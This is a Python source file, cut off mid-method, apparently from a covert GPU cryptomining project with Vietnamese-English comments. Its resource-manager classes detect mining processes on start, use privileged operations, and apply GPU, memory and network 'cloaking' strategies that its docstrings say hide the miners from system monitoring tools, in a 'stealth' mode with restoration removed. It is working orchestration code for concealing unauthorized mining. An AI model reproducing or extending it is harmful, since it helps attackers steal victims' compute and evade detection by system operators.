"""
**Resource Manager Module** (module quản lý tài nguyên - điều phối và tối ưu hóa GPU resources)

**GPU Resource Management System** (hệ thống quản lý tài nguyên GPU) theo **threading model** (mô hình đa luồng).

**Post-Refactor Architecture** (kiến trúc sau tái cấu trúc):
- **Monitoring System Removal** (loại bỏ hệ thống giám sát) - nhiệt độ, công suất & watchers
- **Restoration Mechanism Removal** (loại bỏ cơ chế khôi phục) - không hỗ trợ restore
- **Auto Discovery & Cloaking** (tự động khám phá & che giấu) - phát hiện và cloak processes ngay khi start
- **Cloaking-Only Mode** (chế độ chỉ che giấu) - không có restoration capabilities
"""

import logging
import psutil
import pynvml
import traceback
import threading
import concurrent.futures  # ✅ NEW: ThreadPoolExecutor for per-strategy timeout
import queue
import time
from threading import RLock
from typing import List, Any, Dict, Optional
from itertools import count
from pathlib import Path

# **Project-Specific Imports** (imports đặc thù dự án - các module core của mining environment)
from mining_environment.scripts.utils import MiningProcess
from mining_environment.scripts.resource_control import ResourceControlFactory, CloakStrategyFactory
from mining_environment.scripts.auxiliary_modules.interfaces import IResourceManager
from mining_environment.scripts.auxiliary_modules.models import ConfigModel
# 🗑️ **EventBus Import Removed** (loại bỏ import EventBus - thay thế bằng DirectPIDRegistry)
from mining_environment.scripts.privileged_operations import get_privileged_manager
from mining_environment.scripts.unified_logging import get_unified_logger
from mining_environment.scripts.error_management import get_error_reporter, ErrorCode, ErrorSeverity, report_error

# ✅ **MODULE-LEVEL LOGGER** (logger cấp module - tạo logger ở module level cho @classmethod usage)
module_logger = get_unified_logger('resource_manager')

# ✅ **INTELLIGENT CACHING** (bộ nhớ đệm thông minh - sử dụng hệ thống cache chiến lược nâng cao)
from mining_environment.scripts.strategy_cache import get_strategy_cache, CacheEvictionPolicy

class SharedResourceManager:
    """
    **Shared Resource Manager Class** (lớp quản lý tài nguyên chia sẻ)
    
    **GPU Resource Management** (quản lý tài nguyên GPU) với **NVML Integration** (tích hợp NVML):
    - **NVML Lifecycle Management** (quản lý vòng đời NVML) - khởi tạo/tắt NVML safely
    - **GPU Usage Monitoring** (giám sát sử dụng GPU) - đọc GPU usage và cache usage
    - **Cloaking Strategy Application** (áp dụng chiến lược che giấu) - apply CloakStrategy cho processes
    
    **Shared Architecture** (kiến trúc chia sẻ) - được sử dụng bởi multiple ResourceManager instances.
    """

    def __init__(self, config: ConfigModel, logger: logging.Logger, resource_managers: Dict[str, Any]):
        # ✅ **UNIFIED LOGGING** (ghi log thống nhất - sử dụng unified logger cho consistent logging across system)
        self.logger = get_unified_logger('resource_manager')
        self.config = config
        self.resource_managers = resource_managers
        # ✅ **INTELLIGENT CACHING SYSTEM** (hệ thống bộ nhớ đệm thông minh - thay thế dict đơn giản bằng intelligent cache)
        self.strategy_cache = get_strategy_cache(
            max_size=500,  # **Reasonable Cache Size** (kích thước cache hợp lý - cho strategy objects)
            ttl_seconds=7200.0,  # **TTL Configuration** (cấu hình TTL - 2 tiếng cho strategy objects)
            eviction_policy=CacheEvictionPolicy.INTELLIGENT
        )
        
        # ✅ **CACHE METRICS TRACKING** (theo dõi metrics bộ nhớ đệm - track cache performance cho optimization)
        self.cache_metrics_interval = 300  # **Metrics Interval** (khoảng cách metrics - 5 phút)
        self.last_cache_metrics_log = time.time()
        
        # **Privileged Operation Manager Initialization** (khởi tạo quản lý thao tác đặc quyền - singleton pattern)
        self.privileged_manager = get_privileged_manager(logger)
        
        # **Security Context Validation** (xác thực ngữ cảnh bảo mật - kiểm tra user permissions và root access)
        security_context = self.privileged_manager.validate_security_context()
        self.logger.info(f"Security context: User={security_context['user']}, Root={security_context['is_root']}")

        self._nvml_init = False
        try:
            self.initialize_nvml()
            self.logger.info("✅ **SharedResourceManager** khởi tạo thành công - GPU resource management sẵn sàng")
        except Exception as e:
            self.logger.error(f"❌ **SharedResourceManager Initialization Failed** (khởi tạo SharedResourceManager thất bại): {e}\n{traceback.format_exc()}")
            raise

    def is_nvml_initialized(self) -> bool:
        return self._nvml_init

    def initialize_nvml(self):
        """
        **Thread-Safe NVML Initialization** (khởi tạo NVML an toàn luồng)
        
        Thực hiện khởi tạo **NVIDIA Management Library** (thư viện quản lý NVIDIA) với
        **threading-based timeout** (thời gian chờ dựa trên luồng) để tránh system hangs.
        
        **Safety Features** (tính năng an toàn):
        - **ThreadPoolExecutor** với configurable timeout
        - **Thread-safe execution** (thực thi an toàn luồng)
        - **Graceful fallback** (fallback duyên dáng) khi NVML không khả dụng
        
        Note:
            Method này được gọi automatically trong __init__ và có thể retry safely.
        """
        if not self._nvml_init:
            try:
                # ✅ **THREAD-SAFE NVML INIT** (khởi tạo NVML an toàn luồng - sử dụng concurrent.futures timeout)
                self.logger.debug("🔍 **Thread-Safe NVML Init** (khởi tạo NVML an toàn luồng) - starting initialization process")
                
                # ✅ **THREADING-BASED TIMEOUT** (thời gian chờ dựa trên luồng - an toàn hơn cho môi trường đa luồng)
                import time
                
                def nvml_init_worker():
                    """
                    **NVML Initialization Worker** (worker khởi tạo NVML)
                    
                    **Isolated Worker Function** (hàm worker cô lập) thực hiện NVML init
                    trong **separate thread** (luồng riêng biệt) để avoid blocking main thread.
                    """
                    try:
                        pynvml.nvmlInit()
                        return True
                    except Exception as e:
                        self.logger.debug(f"❌ **NVML Worker Exception** (ngoại lệ worker NVML): {e}")
                        raise
                
                # ✅ **THREAD-SAFE EXECUTION** (thực thi an toàn luồng - sử dụng ThreadPoolExecutor với timeout)
                with concurrent.futures.ThreadPoolExecutor(max_workers=1, thread_name_prefix="NVML_Init") as executor:
                    future = executor.submit(nvml_init_worker)
                    
                    try:
                        # ✅ **CONFIGURABLE TIMEOUT** (thời gian chờ có thể cấu hình - 3 giây timeout cho NVML init)
                        result = future.result(timeout=3.0)
                        self._nvml_init = True
                        self.logger.info("✅ **NVML Initialization Success** (khởi tạo NVML thành công) - thread-safe mode active")
                        
                    except concurrent.futures.TimeoutError:
                        self.logger.warning("⏰ **NVML Initialization Timeout** (khởi tạo NVML quá thời gian) - timeout 3s, tiếp tục without GPU support")
                        future.cancel()  # Cancel the running task
                        self._nvml_init = False
                    
            except Exception as e:
                self.logger.warning(f"❌ **NVML Initialization Failed** (khởi tạo NVML thất bại): {e} - tiếp tục without GPU support")
                self._nvml_init = False

    def shutdown_nvml(self):
        if self._nvml_init:
            try:
                pynvml.nvmlShutdown()
                self._nvml_init = False
                self.logger.debug("✅ **NVML Shutdown Success** (tắt NVML thành công) - GPU resources properly released")
            except pynvml.NVMLError as e:
                self.logger.error(f"❌ **NVML Shutdown Error** (lỗi tắt NVML): {e}")

    def get_process_cache_usage(self, pid: int) -> float:
        """
        **Process Cache Usage Analysis** (phân tích sử dụng cache tiến trình)
        
        Đọc thông tin cache từ **proc filesystem** (hệ thống file proc) và tính toán
        **cache usage percentage** (phần trăm sử dụng cache) so với total system RAM.
        
        **Implementation Details** (chi tiết triển khai):
        - Đọc `/proc/[pid]/status` → **VmCache field** (trường VmCache)
        - Tính **percentage** (phần trăm) so với **total RAM** (tổng RAM hệ thống)
        - **Error handling** (xử lý lỗi) cho missing processes và file access
        
        Args:
            pid: **Process ID** (ID tiến trình) cần phân tích cache usage
            
        Returns:
            float: **Cache usage percentage** (phần trăm sử dụng cache) của process
        """
        try:
            status_file = f"/proc/{pid}/status"
            with open(status_file, 'r') as f:
                for line in f:
                    if line.startswith("VmCache:"):
                        cache_kb = int(line.split()[1])
                        total_mem_kb = psutil.virtual_memory().total / 1024
                        cache_percent = (cache_kb / total_mem_kb) * 100
                        self.logger.debug(f"📊 **Cache Usage Analysis** (phân tích sử dụng cache) - PID={pid}: {cache_percent:.2f}%")
                        return cache_percent
            self.logger.warning(f"⚠️ **VmCache Field Missing** (thiếu trường VmCache) - không tìm thấy cho PID={pid}")
            return 0.0
        except FileNotFoundError:
            self.logger.error(f"❌ **Process Not Found** (không tìm thấy tiến trình) - PID={pid} không tồn tại khi lấy cache info")
            return 0.0
        except Exception as e:
            self.logger.error(f"❌ **Cache Usage Analysis Error** (lỗi phân tích cache usage) - PID={pid}: {e}\n{traceback.format_exc()}")
            return 0.0

    def get_gpu_usage_percent(self, pid: int) -> float:
        try:
            return self._sync_get_gpu_usage_percent(pid)
        except Exception as e:
            self.logger.error(f"Lỗi bất ngờ trong get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def _sync_get_gpu_usage_percent(self, pid: int) -> float:
        try:
            if not self.is_nvml_initialized():
                self.logger.debug("_sync_get_gpu_usage_percent: NVML chưa init => init.")
                self.initialize_nvml()

            if not self._nvml_init:
                return 0.0

            device_count = pynvml.nvmlDeviceGetCount()
            total_gpu_usage = 0.0
            gpu_present = False

            for i in range(device_count):
                handle = pynvml.nvmlDeviceGetHandleByIndex(i)
                procs = pynvml.nvmlDeviceGetComputeRunningProcesses(handle)
                for proc in procs:
                    if proc.pid == pid:
                        gpu_present = True
                        utilization = pynvml.nvmlDeviceGetUtilizationRates(handle)
                        total_gpu_usage += utilization.gpu

            return total_gpu_usage if gpu_present else 0.0
        except pynvml.NVMLError as e:
            self.logger.error(f"❌ **GPU Usage Collection Error** (lỗi thu thập sử dụng GPU): {e}")
            return 0.0
        except Exception as e:
            self.logger.error(f"❌ **Unexpected GPU Usage Error** (lỗi GPU usage không xác định) trong _sync_get_gpu_usage_percent: {e}\n{traceback.format_exc()}")
            return 0.0

    def apply_cloak_strategy(self, strategy_name: str, process: MiningProcess):
        """
        **Cloaking Strategy Application** (áp dụng chiến lược che giấu)
        
        Áp dụng **specific cloaking strategy** (chiến lược che giấu cụ thể) cho một
        **target mining process** (tiến trình khai thác mục tiêu) để ẩn GPU usage khỏi
        system monitoring tools.
        
        **Strategy Support** (hỗ trợ chiến lược):
        - **GPU Cloaking** (che giấu GPU) - ẩn GPU utilization
        - **Memory Cloaking** (che giấu bộ nhớ) - với coordination support
        - **Network Cloaking** (che giấu mạng) - ẩn network activity
        - **Coordinated Cloaking** (che giấu có phối hợp) - với hook recovery
        
        Args:
            strategy_name: **Strategy name** (tên chiến lược) - 'gpu_cloaking', 'memory', 'network'
            process: **MiningProcess object** (đối tượng MiningProcess) cần apply cloaking
            
        Note:
            Method tự động inject **PrivilegedManager** (quản lý đặc quyền) nếu strategy cần.
        """
        try:
            pid = process.pid
            name = process.name
            self.logger.debug(f"🎯 **Strategy Creation** (tạo chiến lược) - '{strategy_name}' cho {name} (PID={pid})")
            strategy = CloakStrategyFactory.create_strategy(
                strategy_name,
                self.config,
                self.logger,
                self.resource_managers
            )
            if not strategy or not callable(getattr(strategy, 'apply', None)):
                self.logger.error(f"❌ **Strategy Not Available** (chiến lược không khả dụng) - '{strategy_name}' không được hỗ trợ")
                return

            # **Privileged Manager Injection** (tiêm quản lý đặc quyền - inject nếu strategy cần)
            if hasattr(strategy, 'set_privileged_manager'):
                strategy.set_privileged_manager(self.privileged_manager)

            self.logger.info(f"🚀 **Strategy Application Start** (bắt đầu áp dụng chiến lược) - '{strategy_name}' cho {name} (PID={pid})")
            
            # **COORDINATED CLOAKING** (che giấu có phối hợp - sử dụng coordination cho memory strategy)
            if strategy_name == 'memory' and hasattr(strategy, 'apply_with_coordination'):
                try:
                    # **Import coordinator** (nhập điều phối viên)
                    import sys
                    import os
                    coord_path = os.path.join(os.path.dirname(__file__), '..', 'coordination')
                    if coord_path not in sys.path:
                        sys.path.insert(0, coord_path)
                    from coordinator import get_hook_coordinator
                    
                    coordinator = get_hook_coordinator()
                    
                    self.logger.info(f"🔄 [COORDINATED STRATEGY] Using coordinated memory cloaking for PID={pid}")
                    
                    # **Apply with coordination** (áp dụng với phối hợp)
                    success = strategy.apply_with_coordination(process, coordinator, timeout=70)
                    
                    if success:
                        self.logger.info(f"✅ [COORDINATED SUCCESS] Coordinated memory cloaking completed for PID={pid}")
                    else:
                        self.logger.error(f"❌ [COORDINATED FAILED] Coordinated memory cloaking failed for PID={pid}")
                        self.logger.error(f"🚨 [SAFETY] Memory cloaking was safely ABORTED to prevent std::bad_alloc")
                        return  # **Don't proceed with uncoordinated cloaking** (không tiến hành che giấu không phối hợp)
                        
                except Exception as coord_err:
                    self.logger.error(f"❌ [COORDINATION ERROR] Failed to setup coordination for memory strategy: {coord_err}")
                    self.logger.warning(f"🔄 [FALLBACK] Falling back to standard memory cloaking (UNSAFE)")
                    # **Fallback to standard apply** (dự phòng bằng áp dụng tiêu chuẩn)
                    strategy.apply(process)
            else:
                # **Standard strategy application** (áp dụng chiến lược tiêu chuẩn)
                strategy.apply(process)
                
            self.logger.info(f"✅ **Strategy Application Complete** (hoàn thành áp dụng chiến lược) - '{strategy_name}' cho {name} (PID={pid})")

            # ✅ REMOVED: CPU support completely removed

        except psutil.NoSuchProcess as e:
            self.logger.error(f"❌ **Process Not Found** (tiến trình không tồn tại): {e}")
        except psutil.AccessDenied as e:
            self.logger.error(f"❌ **Access Denied** (không đủ quyền) - áp dụng cloaking '{strategy_name}' cho PID {process.pid}: {e}")
        except Exception as e:
            self.logger.error(
                f"❌ **Cloaking Strategy Error** (lỗi chiến lược cloaking) - '{strategy_name}' cho {name} (PID={pid}): {e}\n{traceback.format_exc()}"
            )
            raise

class ResourceManager(IResourceManager):
    """
    **Main Resource Manager Class** (lớp quản lý tài nguyên chính)
    
    **Simplified Architecture** (kiến trúc đơn giản hóa) sau refactor với core functionality:
    - **SharedResourceManager Initialization** (khởi tạo SharedResourceManager) - GPU resource management
    - **Process Discovery & Cloaking** (khám phá & che giấu tiến trình) - một lần discovery và cloak tất cả
    - **No Monitoring or Restoration** (không giám sát hay khôi phục) - cloaking-only mode
    
    **PHASE 2 Enhancements** (cải tiến PHASE 2):
    - **Readiness Signaling System** (hệ thống tín hiệu sẵn sàng) - eliminate race conditions
    - **Enhanced Hook Coordination** (phối hợp hook nâng cao) - với recovery mechanisms
    - **Progressive Memory Management** (quản lý bộ nhớ tiên tiến) - prevent std::bad_alloc
    - **DirectPIDRegistry Integration** (tích hợp DirectPIDRegistry) - thay thế EventBus
    
    **Thread-Safe Singleton** (singleton an toàn luồng) với proper initialization control.
    """

    _instance = None
    _instance_lock = threading.Lock()
    # **PHASE 2: Readiness Signaling System** (hệ thống tín hiệu sẵn sàng)
    _ready_event = threading.Event()  # Signal khi ResourceManager fully initialized
    _initialization_lock = threading.RLock()  # Additional lock for initialization safety

    def __new__(cls, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """
        **Clean Object Creation** (tạo đối tượng sạch)
        
        CLEAN ARCHITECTURE: Chỉ handle object creation, KHÔNG initialize attributes.
        All attribute initialization được thực hiện trong __init__ method.
        """
        with cls._instance_lock:
            if cls._instance is None:
                cls._instance = super(ResourceManager, cls).__new__(cls)
                # ✅ **CLEAN ARCHITECTURE** (kiến trúc sạch - KHÔNG khởi tạo attributes ở đây)
                # **All Attributes Init in __init__** (tất cả attributes sẽ được init trong __init__ method)
                module_logger.debug("🎯 **ResourceManager Singleton Created** (tạo ResourceManager singleton) - clean creation pattern")
        return cls._instance

    def __init__(self, config: ConfigModel, legacy_event_bus=None, logger: logging.Logger = None):
        """
        **Clean Attribute Initialization** (khởi tạo thuộc tính sạch)
        
        CLEAN ARCHITECTURE: Handle ALL attribute initialization here.
        Includes _creation_time và other instance attributes moved from __new__.
        """
        if getattr(self, '_initialized', False):
            # **Singleton Already Initialized** (singleton đã khởi tạo - tránh duplicate initialization)
            module_logger.debug("🔄 **ResourceManager Singleton Accessed** (truy cập ResourceManager singleton) - already initialized")
            return

        self._initialized = True
        # ✅ **CLEAN ARCHITECTURE** (kiến trúc sạch - TẤT CẢ attribute initialization trong __init__)
        self._creation_time = time.time()  # **Creation Time** (thời gian tạo - moved from __new__ method)
        self._init_time = time.time()
        module_logger.debug(f"ResourceManager initialization started với clean architecture")
        
        # ✅ UNIFIED: Use unified logger for consistent logging hierarchy
        self.logger = get_unified_logger('resource_manager')
        
        # ✅ ENHANCED: Configuration validation before initialization
        self.config = self._validate_configuration(config)
        # 🗑️ **REMOVED**: EventBus completely removed - DirectPIDRegistry handles all process communication

        # Cờ dừng
        self._stop_flag = False

        # Danh sách process + lock
        self.mining_processes_lock = threading.RLock()
        self.mining_processes: List[MiningProcess] = []

        # ✅ REMOVED: GPU-only queue - simplified logic in enqueue_cloaking()

        # 🚀 **DIRECT REGISTRY OBSERVER** (quan sát registry trực tiếp) - **THAY THẾ EVENTBUS**
        self._setup_direct_registry_observer()
        
        # ✅ **LINEAR FLOW INTEGRATION** (tích hợp luồng tuyến tính) - Enhanced coordination tracking
        self._linear_handoff_tracking = {}
        self._linear_handoff_lock = threading.Lock()
        
        # Hàng đợi cloaking chung (legacy compatibility)
        self.resource_adjustment_queue = queue.PriorityQueue()

        # Thread workers
        self.workers: List[threading.Thread] = []

        self.shared_resource_manager: Optional[SharedResourceManager] = None

        self._counter = count()
        # ✅ NEW: Unique worker identifier for logging & cache metadata
        #    Mỗi ResourceManager (và các thread làm việc của nó) sẽ dùng cùng một worker_id
        #    nhằm gắn nhãn (tag) các đối tượng chiến lược được lưu trong cache. Việc này
        #    khắc phục lỗi AttributeError: 'ResourceManager' object has no attribute 'worker_id'.
        self.worker_id = next(self._counter)
        self.process_states: Dict[int, str] = {}  # "normal", "cloaking", "cloaked"
        
        # ✅ NEW: Wrapper PID tracking - ignore wrapper PIDs, only cloak real mining PIDs
        self.ignored_wrapper_pids = set()  # Track wrapper PIDs to ignore during process discovery
        
        # ✅ ENHANCED: Strategy metrics tracking for success/failure monitoring
        self.strategy_metrics: Dict[int, Dict[str, Any]] = {}  # PID -> metrics data
        
        # ✅ ERROR MANAGEMENT: Initialize error reporter with DirectPIDRegistry architecture
        self.error_reporter = get_error_reporter(None)

        self.logger.info("ResourceManager.__init__ (simplified with unified cloaking queue)")

        # ✅ PROCESS COMMUNICATION: DirectPIDRegistry observers handle all process events
        
    # **PHASE 2: Readiness Signaling Class Methods** (phương thức lớp tín hiệu sẵn sàng)
    @classmethod
    def wait_for_ready(cls, timeout: float = 10.0) -> bool:
        """
        **Wait for ResourceManager Readiness** (chờ ResourceManager sẵn sàng)
        
        Thread-safe method để wait cho ResourceManager hoàn thành initialization.
        
        Args:
            timeout: Maximum time to wait in seconds (thời gian chờ tối đa)
            
        Returns:
            bool: True nếu ResourceManager ready trong timeout, False nếu timeout
        """
        try:
            ready = cls._ready_event.wait(timeout)
            if ready:
                module_logger.info(f"✅ [RM-READY] ResourceManager confirmed ready within {timeout}s")
            else:
                module_logger.warning(f"⏰ [RM-READY] ResourceManager readiness timeout after {timeout}s")
            return ready
        except Exception as e:
            module_logger.error(f"❌ [RM-READY] Error waiting for readiness: {e}")
            return False
    
    @classmethod
    def is_ready(cls) -> bool:
        """
        **Check ResourceManager Readiness** (kiểm tra ResourceManager sẵn sàng)
        
        Non-blocking check để determine nếu ResourceManager đã ready.
        
        Returns:
            bool: True nếu ResourceManager ready, False otherwise
        """
        try:
            ready = cls._ready_event.is_set()
            module_logger.debug(f"🔍 [RM-READY] Readiness check: {ready}")
            return ready
        except Exception as e:
            module_logger.error(f"❌ [RM-READY] Error checking readiness: {e}")
            return False
    
    @classmethod
    def signal_ready(cls):
        """
        **Signal ResourceManager Ready** (báo hiệu ResourceManager sẵn sàng)
        
        Internal method để signal rằng ResourceManager đã fully initialized.
        Called automatically by start() method khi initialization completes.
        """
        try:
            if not cls._ready_event.is_set():
                cls._ready_event.set()
                module_logger.info("🎯 [RM-READY] ResourceManager readiness signaled - now accepting connections")
            else:
                module_logger.debug("🔍 [RM-READY] Readiness signal already set")
        except Exception as e:
            module_logger.error(f"❌ [RM-READY] Error signaling readiness: {e}")
    
    @classmethod
    def clear_ready_signal(cls):
        """
        **Clear ResourceManager Ready Signal** (xóa tín hiệu ResourceManager sẵn sàng)
        
        Internal method để clear readiness signal khi shutdown hoặc reinitializing.
        """
        try:
            if cls._ready_event.is_set():
                cls._ready_event.clear()
                module_logger.info("🔄 [RM-READY] ResourceManager readiness signal cleared")
            else:
                module_logger.debug("🔍 [RM-READY] Readiness signal already cleared")
        except Exception as e:
            module_logger.error(f"❌ [RM-READY] Error clearing readiness signal: {e}")
    
    def _validate_configuration(self, config: ConfigModel) -> ConfigModel:
        """
        **Configuration Validation** (xác thực cấu hình – kiểm tra thông số hệ thống GPU mining)
        
        Thực hiện validation cho **GPU mining configuration** đảm bảo có đầy đủ **cloaking strategies** 
        và **proper config object structure** cho ResourceManager operations.
        
        Args:
            config: **ConfigModel** (mô hình cấu hình – object chứa GPU mining parameters)
            
        Returns:
            **ConfigModel**: **Validated configuration** (cấu hình đã xác thực – config với proper cloaking strategies)
            
        Raises:
            ValueError: Khi **critical validation** (xác thực quan trọng – kiểm tra cloaking strategies) thất bại
        """
        try:
            self.logger.info("🔍 Đang thực hiện **Configuration Validation** (xác thực cấu hình GPU mining)...")
            
            # ✅ **VALIDATION 1** (xác thực 1): **Cloaking Strategies Setup** (thiết lập chiến lược che giấu)
            cloaking_strategies = getattr(config, 'cloaking_strategies', None)
            if not cloaking_strategies:
                self.logger.warning("⚠️ No cloaking strategies configured - using defaults")
                default_strategies = {
                    # CPU cloaking completely removed
                    'gpu_cloaking': {'enabled': True},
                    'network': {'enabled': True},
                    'memory': {'enabled': True}
                }
                if hasattr(config, 'data') and isinstance(config.data, dict):
                    config.data['cloaking_strategies'] = default_strategies
                else:
                    # Fallback: set attribute directly
                    setattr(config, 'cloaking_strategies', default_strategies)
            
            # ✅ **VALIDATION 2** (xác thực 2): **Strategy Configuration Verification** (xác minh cấu hình chiến lược)
            if cloaking_strategies:
                required_strategies = ['gpu_cloaking']  # GPU-only mode
                for strategy in required_strategies:
                    if strategy not in cloaking_strategies:
                        self.logger.warning(f"⚠️ Missing required strategy '{strategy}' - enabling by default")
                        cloaking_strategies[strategy] = {'enabled': True}
                    
                    elif not isinstance(cloaking_strategies[strategy], dict):
                        self.logger.warning(f"⚠️ Invalid configuration for strategy '{strategy}' - resetting")
                        cloaking_strategies[strategy] = {'enabled': True}
            
            # ✅ **VALIDATION 3** (xác thực 3): **Config Method Support** (hỗ trợ phương thức config)
            if not hasattr(config, 'get'):
                self.logger.warning("⚠️ Config missing 'get' method - adding wrapper")
                original_config = config
                
                class ConfigWrapper:
                    def __init__(self, original):
                        self._original = original
                        self.__dict__.update(original.__dict__)
                    
                    def get(self, key, default=None):
                        if hasattr(self._original, 'data') and isinstance(self._original.data, dict):
                            return self._original.data.get(key, default)
                        return getattr(self._original, key, default)
                
                config = ConfigWrapper(original_config)
            
            self.logger.info("✅ **Configuration Validation** (xác thực cấu hình) hoàn tất thành công")
            
            # ✅ **CONFIGURATION SUMMARY** (tóm tắt cấu hình) - updated metrics
            strategy_count = len(getattr(config, 'cloaking_strategies', {}))
            self.logger.info(f"📋 **Configuration Summary** (tóm tắt cấu hình): {strategy_count} **cloaking strategies** (chiến lược che giấu)")
            
            return config
            
        except Exception as e:
            error_msg = f"❌ **Configuration Validation** (xác thực cấu hình) thất bại: {e}"
            self.logger.error(error_msg)
            raise ValueError(error_msg) from e

    def is_gpu_initialized(self) -> bool:
        """
        Kiểm tra xem GPU (NVML) đã được khởi tạo hay chưa.
        """
        return self.shared_resource_manager and self.shared_resource_manager.is_nvml_initialized()

    def handle_resource_adjustment(self, event_data: Dict[str, Any]):
        """
        ✅ SIMPLIFIED: Minimal resource adjustment handler
        """
        try:
            pid = event_data.get('pid')
            adjustment_type = event_data.get('type', 'unknown')
            
            self.logger.info(f"Processing resource adjustment for PID={pid}, type={adjustment_type}")
            
        except Exception as e:
            self.logger.error(f"❌ Error in resource adjustment processing: {e}")

    def _setup_direct_registry_observer(self):
        """
        🚀 **Direct Registry Observer Setup** (thiết lập quan sát registry trực tiếp)
        
        CORE REPLACEMENT cho EventBus subscriptions - sử dụng DirectPIDRegistry observers.
        Đăng ký ResourceManager làm observer để nhận immediate notifications
        khi có process mới được registered trong DirectPIDRegistry.
        """
        try:
            self.logger.info("🔌 Setting up DirectPIDRegistry Observer (DirectPIDRegistry replaces EventBus)...")
            
            # **Import DirectPIDRegistry** (nhập DirectPIDRegistry)
            try:
                from pid_logger.direct_registry import get_direct_registry
                self.direct_registry = get_direct_registry()
            except ImportError as import_err:
                self.logger.error(f"❌ Failed to import DirectPIDRegistry: {import_err}")
                self.logger.warning("⚠️ Running without Direct Registry - falling back to periodic discovery only")
                self.direct_registry = None
                return
            
            # **Register ResourceManager as observer** (đăng ký ResourceManager làm observer)
            if self.direct_registry:
                success = self.direct_registry.register_observer(self._on_process_registered_direct)
                
                if success:
                    self.logger.info("✅ Direct Registry Observer established successfully")
                    self.logger.info("📊 ResourceManager will receive immediate process notifications")
                    
                    # **Registry statistics logged at startup** (thống kê registry được ghi lại khi khởi động)
                    # Stats available via get_statistics() method when needed
                        
                else:
                    self.logger.error("❌ Failed to register Direct Registry Observer")
                    self.direct_registry = None
            
        except Exception as e:
            self.logger.error(f"❌ Direct Registry Observer setup failed: {e}")
            self.logger.warning("⚠️ Running without Direct Registry - using periodic discovery only")
            self.direct_registry = None

    # CPU event handling completely removed - GPU-only mode

    def _on_process_registered_direct(self, process_info) -> None:
        """
        🚀 **Direct Process Registration Handler** (xử lý đăng ký tiến trình trực tiếp)
        
        CORE REPLACEMENT cho _on_gpu_mining_event().
        Nhận ProcessInfo object trực tiếp từ DirectPIDRegistry thay vì event payload.
        
        Args:
            process_info: ProcessInfo object chứa thông tin mining process
        """
        try:
            # **Extract process information** (trích xuất thông tin tiến trình)
            pid = process_info.pid
            process_type = process_info.process_type
            process_name = process_info.process_name
            metadata = process_info.metadata or {}
            
            # **Get registration source** (lấy nguồn đăng ký)
            registration_source = metadata.get('registration_source', 'unknown')
            role = metadata.get('role', 'real')  # Direct registry sends real PID
            stealth_enabled = metadata.get('stealth_enabled', False)
            
            self.logger.info(f"🚀 [DIRECT-REGISTRY] ResourceManager received process registration:")
            self.logger.info(f"   ├─ PID: {pid}")
            self.logger.info(f"   ├─ Type: {process_type}")
            self.logger.info(f"   ├─ Name: {process_name}")
            self.logger.info(f"   ├─ Role: {role}")
            self.logger.info(f"   ├─ Source: {registration_source}")
            self.logger.info(f"   └─ Stealth: {stealth_enabled}")
            
            # **Process GPU mining process registration** (xử lý đăng ký tiến trình khai thác GPU)
            if process_type == "gpu":
                self.logger.info(f"🎮 Processing GPU mining process: PID={pid}, Name={process_name}")
                
                # **ENHANCED: Real PID handling** (xử lý PID thật nâng cao)
                if role == 'real':
                    self.logger.info(f"✅ [REAL-PID] Direct registry provided REAL mining PID: {pid}")
                    
                    # **Immediate cloaking activation** (kích hoạt cloaking tức thì)
                    self.logger.info(f"🔒 [IMMEDIATE-CLOAKING] Activating cloaking for real mining PID {pid}")
                    
                    # **Add to mining processes for tracking** (thêm vào danh sách mining processes để theo dõi)
                    try:
                        mining_process = MiningProcess(
                            pid=pid,
                            process_type=process_type,
                            process_name=process_name,
                            start_time=process_info.start_time,
                            process_obj=process_info.process_obj
                        )
                        
                        with self.mining_processes_lock:
                            # **Check for duplicates** (kiểm tra trùng lặp)
                            existing = [p for p in self.mining_processes if p.pid == pid]
                            if not existing:
                                self.mining_processes.append(mining_process)
                                self.logger.info(f"📋 Added mining process to tracking list: PID={pid}")
                            else:
                                self.logger.info(f"📋 Mining process already tracked: PID={pid}")
                        
                        # **Trigger immediate cloaking via unified method** (kích hoạt cloaking tức thì qua phương thức thống nhất)
                        self.trigger_cloaking(mining_process, 'direct_registry', urgent=True)
                        
                    except Exception as tracking_err:
                        self.logger.error(f"❌ Failed to add mining process to tracking: {tracking_err}")
                else:
                    # **Wrapper PID handling** (xử lý PID wrapper)
                    self.logger.info(f"📦 [WRAPPER-PID] Adding wrapper PID to ignored list: {pid}")
                    if not hasattr(self, 'ignored_wrapper_pids'):
                        self.ignored_wrapper_pids = set()
                    self.ignored_wrapper_pids.add(pid)
                    
            else:
                self.logger.warning(f"⚠️ Unsupported process type: {process_type}")
                
        except Exception as e:
            error_msg = f"❌ Error in direct process registration handler: {e}"
            self.logger.error(error_msg)
            # **Error reporting** (báo cáo lỗi)
            report_error(
                ErrorCode.RESOURCE_MANAGER_ERROR,
                error_msg,
                ErrorSeverity.HIGH
            )
    
    def _create_unified_cloaking_task(self, process: MiningProcess, 
                                    source: str, urgent: bool = False,
                                    coordination_data: Dict = None) -> tuple:
        """
        **Create Unified Task Format** (tạo định dạng task thống nhất)
        
        UNIFIED SOLUTION: Single task format cho tất cả cloaking paths.
        Replaces duplicate formats từ _trigger_immediate_cloaking() và enqueue_cloaking().
        
        Args:
            process: MiningProcess object cần apply cloaking
            source: Nguồn request ('direct_registry', 'discovery', 'file_scanner')
            urgent: True cho immediate cloaking, False cho standard cloaking
            coordination_data: Metadata từ hook coordination (nếu có)
            
        Returns:
            tuple: (priority, timestamp, task_data) for queue
        """
        
        task_data = {
            'type': 'cloaking',                    # **UNIFIED FIELD NAME** (tên trường thống nhất)
            'action': 'immediate_cloak' if urgent else 'standard_cloak',
            'process': process,
            'source': source,                      # 'direct_registry', 'discovery', 'file_scanner'
            'urgent': urgent,
            'strategies': self._determine_strategies(process),
            'coordination_status': coordination_data.get('success', False) if coordination_data else False,
            'fallback_mode': not coordination_data.get('success', True) if coordination_data else False,
            'memory_safe': coordination_data.get('memory_safe', False) if coordination_data else False,
            'coordination_method': coordination_data.get('method', 'none') if coordination_data else 'none',
            'retry_count': coordination_data.get('retry_count', 0) if coordination_data else 0
        }
        
        priority = 0 if urgent else process.priority
        return (priority, time.time(), task_data)
    
    def _determine_strategies(self, process: MiningProcess) -> List[str]:
        """
        **Determine Strategies for Process** (xác định chiến lược cho tiến trình)
        
        Intelligent strategy selection dựa trên process type và system capabilities.
        
        Args:
            process: MiningProcess object
            
        Returns:
            List[str]: Ordered list of strategy names
        """
        try:
